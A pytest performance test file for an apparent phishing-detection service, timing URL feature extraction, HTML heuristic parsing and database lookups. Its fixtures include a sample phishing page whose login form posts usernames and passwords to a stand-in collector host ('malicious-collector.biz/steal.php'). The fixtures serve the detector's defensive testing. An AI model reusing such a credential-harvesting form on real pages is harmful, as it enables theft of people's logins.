import time
import numpy as np
import pytest
from sqlalchemy import select
from app.analyzers.url_analyzer import extract_url_lexical_features
from app.analyzers.html_analyzer import SafeHtmlAnalyzer
from app.core.security import hash_password
from app.models.user import User

SAMPLE_URLS = [
    {
        "normalized_url": "https://secure-login.paypal.account-verify.xyz/signin",
        "hostname": "secure-login.paypal.account-verify.xyz",
        "path": "/signin",
        "query": "",
        "subdomain": "secure-login.paypal",
    },
    {
        "normalized_url": "https://github.com/torvalds/linux",
        "hostname": "github.com",
        "path": "/torvalds/linux",
        "query": "",
        "subdomain": "",
    },
    {
        "normalized_url": "http://192.168.1.100:8080/admin/config.php?token=xyz",
        "hostname": "192.168.1.100",
        "path": "/admin/config.php",
        "query": "token=xyz",
        "subdomain": "",
    },
]

SAMPLE_HTML = """
<!DOCTYPE html>
<html>
<head><title>Verify Your Banking Credentials</title></head>
<body>
  <h1>Account Security Verification</h1>
  <form action="http://malicious-collector.biz/steal.php" method="POST">
    <input type="text" name="username" placeholder="Username" />
    <input type="password" name="password" placeholder="Password" />
    <input type="submit" value="Sign In" />
  </form>
  <iframe src="http://hidden-tracker.biz/embed"></iframe>
  <a href="https://legitimate-bank.com/terms">Terms of Service</a>
  <script src="http://external-cdn.xyz/tracking.js"></script>
</body>
</html>
"""


def compute_percentiles(latencies_ms):
    """Computes real p50, p95, and p99 from measured timing arrays."""
    arr = np.array(latencies_ms)
    return {
        "p50": float(np.percentile(arr, 50)),
        "p95": float(np.percentile(arr, 95)),
        "p99": float(np.percentile(arr, 99)),
        "mean": float(np.mean(arr)),
        "min": float(np.min(arr)),
        "max": float(np.max(arr)),
        "iterations": len(latencies_ms),
    }


def test_url_feature_extraction_latency():
    """Measures lexical feature extraction latency across 50 iterations."""
    latencies = []

    # Warm-up run
    for sample in SAMPLE_URLS:
        extract_url_lexical_features(sample)

    # Measured benchmark runs
    for _ in range(50):
        for sample in SAMPLE_URLS:
            t0 = time.perf_counter()
            features = extract_url_lexical_features(sample)
            t1 = time.perf_counter()
            latencies.append((t1 - t0) * 1000)  # Convert to ms
            assert isinstance(features, dict)
            assert "url_length" in features

    stats = compute_percentiles(latencies)
    print(f"\n[PERFORMANCE] URL Feature Extraction (ms): {stats}")
    # Engineering threshold: sub-millisecond p95 for lexical analysis
    assert stats["p95"] < 50.0, f"URL extraction p95 too slow: {stats['p95']}ms"


def test_dom_parsing_latency():
    """Measures DOM / HTML heuristic analysis latency across 30 iterations."""
    latencies = []

    # Warm-up
    SafeHtmlAnalyzer.parse_html(SAMPLE_HTML, "https://secure-bank.example.com")

    for _ in range(30):
        t0 = time.perf_counter()
        meta, soup = SafeHtmlAnalyzer.parse_html(SAMPLE_HTML, "https://secure-bank.example.com")
        t1 = time.perf_counter()
        latencies.append((t1 - t0) * 1000)
        assert meta is not None

    stats = compute_percentiles(latencies)
    print(f"\n[PERFORMANCE] DOM Heuristic Analysis (ms): {stats}")
    assert stats["p95"] < 100.0, f"DOM parsing p95 too slow: {stats['p95']}ms"


@pytest.mark.asyncio
async def test_db_query_latency(db_session):
    """Measures indexed database query latency across 30 iterations."""
    # Seed test users
    for i in range(10):
        db_session.add(
            User(
                email=f"perf_user_{i}@phishguard.ai",
                hashed_password=hash_password("PerfPassword2026!"),
                full_name=f"Perf User {i}",
                role="analyst",
                is_active=True,
            )
        )
    await db_session.commit()

    latencies = []
    for i in range(30):
        email_lookup = f"perf_user_{i % 10}@phishguard.ai"
        t0 = time.perf_counter()
        stmt = select(User).where(User.email == email_lookup)
        res = await db_session.execute(stmt)
        user = res.scalar_one_or_none()
        t1 = time.perf_counter()
        latencies.append((t1 - t0) * 1000)
        assert user is not None

    stats = compute_percentiles(latencies)
    print(f"\n[PERFORMANCE] Database Indexed Query Latency (ms): {stats}")
    assert stats["p95"] < 50.0, f"DB query p95 too slow: {stats['p95']}ms"
